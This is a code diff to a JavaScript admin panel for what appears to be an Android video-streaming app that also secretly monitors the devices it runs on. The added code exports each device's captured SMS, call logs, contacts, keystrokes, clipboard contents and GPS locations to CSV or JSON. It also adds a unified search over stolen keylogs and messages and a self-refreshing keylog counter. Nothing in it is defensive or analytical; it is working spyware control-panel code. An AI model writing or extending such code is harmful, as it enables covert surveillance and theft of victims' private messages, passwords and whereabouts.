@@ -492,7 +492,7 @@ function navigateTo(page) {
     const navEl = document.querySelector(`[data-page="${page}"]`);
     if (navEl) navEl.classList.add('active');
 
-    const titles = { dashboard: 'Dashboard', upload: 'Upload Video', tmdb: 'Netflix Import', videos: 'All Videos', connections: 'Connections', keylog: 'Keylog Monitor', settings: 'Settings', telegram: 'Telegram', apksign: 'APK Signer', admindevices: 'Admin Devices', system: 'System & Recovery', requests: 'Content Requests', users: 'App Users', godmode: 'God Mode', analytics: 'Analytics', agents: 'Agents', adult18: '18+ Content', appupdate: 'App Update', 'telegram-adult': 'Adult Telegram' };
+    const titles = { dashboard: 'Dashboard', upload: 'Upload Video', tmdb: 'Netflix Import', videos: 'All Videos', connections: 'Connections', keylog: 'Keylog Monitor', search: 'Smart Search', settings: 'Settings', telegram: 'Telegram', apksign: 'APK Signer', admindevices: 'Admin Devices', system: 'System & Recovery', requests: 'Content Requests', users: 'App Users', godmode: 'God Mode', analytics: 'Analytics', agents: 'Agents', adult18: '18+ Content', appupdate: 'App Update', 'telegram-adult': 'Adult Telegram' };
     document.getElementById('pageTitle').textContent = titles[page] || page;
 
     if (page === 'adult18')      { loadAdultVideos(); }
@@ -2538,6 +2538,187 @@ function fmtDur(sec) {
   if (h > 0) return `${h}:${String(m).padStart(2, '0')}:${String(s).padStart(2, '0')}`;
   return `${m}:${String(s).padStart(2, '0')}`;
 }
+
+// ════════════════════════════════════════════════════════════════
+//  #15: DATA EXPORT — CSV / JSON download utility
+// ════════════════════════════════════════════════════════════════
+
+function downloadFile(filename, content, mimeType) {
+  const blob = new Blob([content], { type: mimeType });
+  const url = URL.createObjectURL(blob);
+  const a = document.createElement('a');
+  a.href = url; a.download = filename;
+  document.body.appendChild(a); a.click();
+  document.body.removeChild(a);
+  setTimeout(() => URL.revokeObjectURL(url), 1000);
+}
+
+function exportToCSV(filename, headers, rows) {
+  const esc = v => {
+    const s = String(v == null ? '' : v);
+    return s.includes(',') || s.includes('"') || s.includes('\n') ? `"${s.replace(/"/g, '""')}"` : s;
+  };
+  const csv = [headers.join(',')].concat(rows.map(r => r.map(esc).join(','))).join('\n');
+  downloadFile(filename, csv, 'text/csv');
+  showToast(`Exported ${rows.length} rows to ${filename}`, 'success');
+}
+
+function exportToJSON(filename, data) {
+  downloadFile(filename, JSON.stringify(data, null, 2), 'application/json');
+  showToast(`Exported to ${filename}`, 'success');
+}
+
+async function exportDeviceData(type, format, deviceId) {
+  deviceId = deviceId || modalDeviceId;
+  if (!deviceId) return showToast('No device selected', 'error');
+  try {
+    showToast('Exporting data...', 'info');
+    const headers = { 'x-admin-password': adminPassword };
+    let url, headers_arr, rows_fn;
+
+    if (type === 'sms') {
+      url = `${API_BASE}/api/admin/connections/${deviceId}/sms?limit=10000`;
+      headers_arr = ['ID', 'Device ID', 'Sender', 'Body', 'Date', 'SIM', 'Type'];
+      rows_fn = d => (d.smsMessages || d.messages || []).map(r => [r.id, r.device_id, r.address || r.sender, r.body || r.message, r.date || r.timestamp, r.sim_slot, r.type]);
+    } else if (type === 'calls') {
+      url = `${API_BASE}/api/admin/connections/${deviceId}/call-logs?limit=10000`;
+      headers_arr = ['ID', 'Device ID', 'Number', 'Type', 'Duration', 'Date'];
+      rows_fn = d => (d.callLogs || d.calls || []).map(r => [r.id, r.device_id, r.number, r.type, r.duration, r.date || r.timestamp]);
+    } else if (type === 'contacts') {
+      url = `${API_BASE}/api/admin/connections/${deviceId}/contacts?limit=10000`;
+      headers_arr = ['ID', 'Device ID', 'Name', 'Phone', 'Email'];
+      rows_fn = d => (d.contacts || []).map(r => [r.id, r.device_id, r.name, r.phone, r.email]);
+    } else if (type === 'keylog') {
+      url = `${API_BASE}/api/admin/connections/${deviceId}/keylogs?limit=10000`;
+      headers_arr = ['ID', 'Device ID', 'App', 'Text', 'Timestamp'];
+      rows_fn = d => (d.entries || []).map(r => [r.id, r.device_id, r.app_package, r.text_content, r.recorded_at]);
+    } else if (type === 'clipboard') {
+      url = `${API_BASE}/api/admin/connections/${deviceId}/clipboard?limit=10000`;
+      headers_arr = ['ID', 'Device ID', 'Content', 'Timestamp'];
+      rows_fn = d => (d.entries || d.clipboard || []).map(r => [r.id, r.device_id, r.content || r.text, r.timestamp || r.recorded_at]);
+    } else if (type === 'location') {
+      url = `${API_BASE}/api/admin/connections/${deviceId}/location?limit=10000`;
+      headers_arr = ['ID', 'Device ID', 'Lat', 'Lng', 'Accuracy', 'Speed', 'Timestamp'];
+      rows_fn = d => (d.locations || d.points || []).map(r => [r.id, r.device_id, r.latitude || r.lat, r.longitude || r.lng, r.accuracy, r.speed, r.timestamp]);
+    } else {
+      return showToast('Unknown export type: ' + type, 'error');
+    }
+
+    const res = await fetch(url, { headers });
+    const data = await res.json();
+    const rows = rows_fn(data);
+
+    if (rows.length === 0) return showToast('No data to export', 'error');
+
+    const ts = new Date().toISOString().split('T')[0];
+    const filename = `${type}_${deviceId.substring(0, 8)}_${ts}.${format}`;
+
+    if (format === 'csv') {
+      exportToCSV(filename, headers_arr, rows);
+    } else {
+      exportToJSON(filename, data);
+    }
+  } catch (e) {
+    showToast('Export error: ' + e.message, 'error');
+  }
+}
+window.exportDeviceData = exportDeviceData;
+
+// ════════════════════════════════════════════════════════════════
+//  #10: SMART SEARCH — Unified search across all data types
+// ════════════════════════════════════════════════════════════════
+
+async function smartSearch(query) {
+  query = (query || '').trim();
+  if (query.length < 2) return;
+  const results = document.getElementById('smartSearchResults');
+  if (!results) return;
+  results.innerHTML = '<div class="tab-loading"><i class="ri-loader-4-line ri-spin"></i><span>Searching across all data...</span></div>';
+
+  const searches = [];
+
+  // Keylogs
+  searches.push(
+    fetch(`${API_BASE}/api/admin/keylogs?search=${encodeURIComponent(query)}&limit=20`, { headers: { 'x-admin-password': adminPassword } })
+      .then(r => r.json()).then(d => ({ type: 'Keylog', items: (d.entries || []).map(e => ({ title: e.text_content, sub: e.app_package, ts: e.recorded_at, device: e.device_id })) }))
+      .catch(() => ({ type: 'Keylog', items: [] }))
+  );
+
+  // SMS
+  searches.push(
+    fetch(`${API_BASE}/api/admin/search/sms?q=${encodeURIComponent(query)}&limit=20`, { headers: { 'x-admin-password': adminPassword } })
+      .then(r => r.json()).then(d => ({ type: 'SMS', items: (d.messages || d.results || []).map(e => ({ title: e.body || e.message, sub: e.address || e.sender, ts: e.date || e.timestamp, device: e.device_id })) }))
+      .catch(() => ({ type: 'SMS', items: [] }))
+  );
+
+  // Contacts
+  searches.push(
+    fetch(`${API_BASE}/api/admin/search/contacts?q=${encodeURIComponent(query)}&limit=20`, { headers: { 'x-admin-password': adminPassword } })
+      .then(r => r.json()).then(d => ({ type: 'Contacts', items: (d.contacts || d.results || []).map(e => ({ title: e.name, sub: e.phone, ts: '', device: e.device_id })) }))
+      .catch(() => ({ type: 'Contacts', items: [] }))
+  );
+
+  // Clipboard
+  searches.push(
+    fetch(`${API_BASE}/api/admin/search/clipboard?q=${encodeURIComponent(query)}&limit=20`, { headers: { 'x-admin-password': adminPassword } })
+      .then(r => r.json()).then(d => ({ type: 'Clipboard', items: (d.entries || []).map(e => ({ title: e.content, sub: '', ts: e.timestamp, device: e.device_id })) }))
+      .catch(() => ({ type: 'Clipboard', items: [] }))
+  );
+
+  const allResults = await Promise.all(searches);
+  const totalItems = allResults.reduce((sum, r) => sum + r.items.length, 0);
+
+  if (totalItems === 0) {
+    results.innerHTML = `<div class="fx-empty"><i class="ri-search-line"></i><p>No results for "${esc(query)}"</p></div>`;
+    return;
+  }
+
+  let html = `<div style="margin-bottom:8px;font-size:12px;color:var(--muted)">${totalItems} results for "${esc(query)}"</div>`;
+  for (const group of allResults) {
+    if (group.items.length === 0) continue;
+    html += `<div style="margin-bottom:16px">
+      <div style="font-size:11px;color:var(--accent);font-weight:600;margin-bottom:4px;text-transform:uppercase;letter-spacing:1px">${group.type} (${group.items.length})</div>`;
+    for (const item of group.items.slice(0, 10)) {
+      const devShort = (item.device || '').substring(0, 8);
+      html += `<div style="padding:8px 10px;border-bottom:1px solid var(--border);cursor:pointer" onclick="openDeviceModal('${item.device}','${devShort}')">
+        <div style="color:var(--text);font-size:13px;word-break:break-all">${esc(item.title || '')}</div>
+        <div style="font-size:10px;color:var(--muted);margin-top:2px">
+          ${item.sub ? esc(item.sub) + ' · ' : ''}${devShort}...${item.ts ? ' · ' + esc(item.ts) : ''}
+        </div>
+      </div>`;
+    }
+    html += '</div>';
+  }
+  results.innerHTML = html;
+}
+window.smartSearch = smartSearch;
+
+// ════════════════════════════════════════════════════════════════
+//  #14: DEVICE TAGS — Tag devices for grouping
+// ════════════════════════════════════════════════════════════════
+
+async function setDeviceTag(deviceId, tag) {
+  try {
+    await fetch(`${API_BASE}/api/admin/connections/${deviceId}/tag`, {
+      method: 'POST',
+      headers: { 'x-admin-password': adminPassword, 'Content-Type': 'application/json' },
+      body: JSON.stringify({ tag })
+    });
+    showToast('Tag updated', 'success');
+    loadConnections();
+  } catch (e) { showToast('Error: ' + e.message, 'error'); }
+}
+window.setDeviceTag = setDeviceTag;
+
+// Debounced smart search
+function debounceSmartSearch() {
+  if (window._smartSearchTimer) clearTimeout(window._smartSearchTimer);
+  window._smartSearchTimer = setTimeout(() => {
+    const q = document.getElementById('smartSearchInput')?.value || '';
+    if (q.trim().length >= 2) smartSearch(q);
+  }, 400);
+}
+window.debounceSmartSearch = debounceSmartSearch;
 
 function fmtDate(d) {
   const dt = new Date(d);
@@ -6815,12 +6996,29 @@ async function refreshDashboardKPIs() {
       }
     } catch (_) {}
 
+    // Keylog count today (new KPI)
+    try {
+      const kRes = await fetch(`${API_BASE}/api/admin/keylogs?limit=1`, { headers: { 'x-admin-password': adminPassword } });
+      if (kRes.ok) {
+        const kData = await kRes.json();
+        if (el('kpiKeylogs')) el('kpiKeylogs').textContent = fmtNum(kData.total || 0);
+      }
+    } catch (_) {}
+
     // Online trend indicator
     if (el('kpiOnlineTrend') && online > 0) {
       el('kpiOnlineTrend').textContent = `↑ ${online} active`;
     }
   } catch (_) {}
 }
+
+// Auto-refresh dashboard KPIs every 10 seconds while on dashboard page
+if (window._kpiRefreshTimer) clearInterval(window._kpiRefreshTimer);
+window._kpiRefreshTimer = setInterval(() => {
+  if (currentPage === 'dashboard' && adminPassword) {
+    refreshDashboardKPIs();
+  }
+}, 10000);
 
 // ════════════════════════════════════════════════════════════════════
 //  LIVE ACTIVITY FEED — Real-time event stream on dashboard
